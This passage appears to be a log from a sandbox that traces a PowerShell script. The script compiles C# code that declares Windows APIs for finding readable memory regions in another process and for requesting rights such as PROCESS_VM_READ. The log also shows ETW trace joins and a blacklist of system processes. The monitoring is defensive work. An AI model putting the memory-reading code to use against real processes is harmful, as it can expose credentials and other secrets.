            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            ushort reserved;
            public uint pageSize;
            public IntPtr minimumApplicationAddress;
            public IntPtr maximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }

        [DllImport("kernel32.dll")]
        public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        public enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }

        public enum TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }

        internal static bool IsDataRegion(MEMORY_BASIC_INFORMATION memInfo)
        {

            bool res =    // check this is a live (not free/reserved) memory
            (memInfo.State & (uint)StateEnum.MEM_COMMIT) != 0 &&
                // don't examine memory mapped files sections / PE images
                //  (memInfo.Type & (uint)TypeEnum.MEM_PRIVATE) != 0 &&
                // don't read PAGE_GUARD memory to avoid altering target state
            (memInfo.Protect & ((uint)AllocationProtect.PAGE_NOACCESS | (uint)AllocationProtect.PAGE_GUARD)) == 0
            &&
                // make sure the memory is readable
            (memInfo.Protect & ((uint)AllocationProtect.PAGE_READONLY | (uint)AllocationProtect.PAGE_READWRITE |
            (uint)AllocationProtect.PAGE_EXECUTE_READ | (uint)AllocationProtect.PAGE_EXECUTE_READWRITE | 
(uint)AllocationProtect.PAGE_EXECUTE_WRITECOPY)) != 0;

            return res;
        }

        public enum ProcessAccessTypes
        {
            PROCESS_TERMINATE = 0x00000001,
            PROCESS_CREATE_THREAD = 0x00000002,
            PROCESS_SET_SESSIONID = 0x00000004,
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_READ = 0x00000010,
            PROCESS_VM_WRITE = 0x00000020,
            PROCESS_DUP_HANDLE = 0x00000040,
            PROCESS_CREATE_PROCESS = 0x00000080,
            PROCESS_SET_QUOTA = 0x00000100,
            PROCESS_SET_INFORMATION = 0x00000200,
            PROCESS_QUERY_INFORMATION = 0x00000400,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            SYNCHRONIZE = 0x00100000,
            PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | 
PROCESS_VM_OPERATION |
              PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_QUOTA |
              PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION | STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE
        }
    }
}

] to param [TypeDefinition] SUCCESSFUL
DEBUG: ParameterBinding Information: 0 :     BIND arg [CSharp] to parameter [Language]
DEBUG: ParameterBinding Information: 0 :         COERCE arg to [Microsoft.PowerShell.Commands.Language]
DEBUG: ParameterBinding Information: 0 :             Trying to convert argument value from System.String to 
Microsoft.PowerShell.Commands.Language
DEBUG: ParameterBinding Information: 0 :             CONVERT arg type to param type using LanguagePrimitives.ConvertTo
DEBUG: ParameterBinding Information: 0 :             CONVERT SUCCESSFUL using LanguagePrimitives.ConvertTo: [CSharp]
DEBUG: ParameterBinding Information: 0 :         BIND arg [CSharp] to param [Language] SUCCESSFUL
DEBUG: ParameterBinding Information: 0 :     BIND arg [System.CodeDom.Compiler.CompilerParameters] to parameter 
[CompilerParameters]
DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.CodeDom.Compiler.CompilerParameters]
DEBUG: ParameterBinding Information: 0 :             Trying to convert argument value from 
System.Management.Automation.PSObject to System.CodeDom.Compiler.CompilerParameters
DEBUG: ParameterBinding Information: 0 :             CONVERT arg type to param type using LanguagePrimitives.ConvertTo
DEBUG: ParameterBinding Information: 0 :             CONVERT SUCCESSFUL using LanguagePrimitives.ConvertTo: 
[System.CodeDom.Compiler.CompilerParameters]
DEBUG: ParameterBinding Information: 0 :         BIND arg [System.CodeDom.Compiler.CompilerParameters] to param 
[CompilerParameters] SUCCESSFUL
DEBUG: ParameterBinding Information: 0 : BIND POSITIONAL cmd line args [Add-Type]
DEBUG: ParameterBinding Information: 0 : MANDATORY PARAMETER CHECK on cmdlet [Add-Type]
DEBUG: ParameterBinding Information: 0 : CALLING BeginProcessing
DEBUG: ParameterBinding Information: 0 : CALLING EndProcessing

*SUSPENDED the spawned-powershell-process 11052 due to: 'DEBUG: ParameterBinding Information: 0 : CALLING EndProcessing
'

sleep now : for 300 seconds
wake up now : as 300 seconds past

Finished All Close-Traces-- Elapsed-Time: 0:00:00.015790

Started joinit for FILE
Finished joinit for FILE -- Elapsed-Time: 0:00:00
Started joinit for REGISTRY
Finished joinit for REGISTRY -- Elapsed-Time: 0:00:00.077999
Started joinit for NETWORK
Finished joinit for NETWORK -- Elapsed-Time: 0:00:00
Started joinit for PROCESS
Finished joinit for PROCESS -- Elapsed-Time: 0:00:00

Finished starting job1,job2,job3,job4 -- Elapsed-Time: 0:00:00

====================================================================================================
added pid 0 of                                                background-process System Idle Process                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4 of                                                background-process System                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 92 of                                                background-process Registry                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 320 of                                                background-process smss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 436 of                                                background-process csrss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 512 of                                                background-process wininit.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 520 of                                                background-process csrss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 576 of                                                background-process winlogon.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 648 of                                                background-process services.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 664 of                                                background-process lsass.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 764 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1020 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1036 of                                                background-process SearchIndexer.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1048 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1140 of                                                background-process sshd.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1200 of                                                background-process MemCompression                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1692 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1720 of                                                background-process spoolsv.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1844 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2028 of                                                background-process MsMpEng.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2108 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2500 of                                                background-process SgrmBroker.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2860 of                                                background-process uhssvc.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4108 of                                                background-process SecurityHealthService.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4200 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 6340 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9884 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 424 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1028 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1160 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1380 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1452 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1616 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1624 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1836 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2052 of                                                background-process dasHost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2088 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2264 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2780 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 884 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1384 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 2572 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
====================================================================================================

Finished Blacklisting Main-Python-Process 5112


*RESUMED the spwaned-powershell-process 11052

DEBUG: ParameterBinding Information: 0 : BIND POSITIONAL cmd line args [Write-Output]
DEBUG: ParameterBinding Information: 0 : BIND REMAININGARGUMENTS cmd line args to param: [InputObject]
DEBUG: ParameterBinding Information: 0 :     BIND arg [System.Collections.Generic.List`1[System.Object]] to parameter 
[InputObject]
DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.Management.Automation.PSObject[]]
DEBUG: ParameterBinding Information: 0 :             Trying to convert argument value from 
System.Collections.Generic.List`1[System.Object] to System.Management.Automation.PSObject[]
DEBUG: ParameterBinding Information: 0 :             ENCODING arg into collection
DEBUG: ParameterBinding Information: 0 :             Binding collection parameter InputObject: argument type [List`1], 
parameter type [System.Management.Automation.PSObject[]], collection type Array, element type 
[System.Management.Automation.PSObject], coerceElementType
spawned_psh_process -- Ended before 1 hr ; with NO exception raised
Closing Last ETW-Session-Set

Finished All Close-Traces-- Elapsed-Time: 0:00:00.015108

Started joinit for FILE
Finished joinit for FILE -- Elapsed-Time: 0:00:00
Started joinit for REGISTRY
Finished joinit for REGISTRY -- Elapsed-Time: 0:00:00.062770
Started joinit for NETWORK
Finished joinit for NETWORK -- Elapsed-Time: 0:00:00
Started joinit for PROCESS
Finished joinit for PROCESS -- Elapsed-Time: 0:00:00
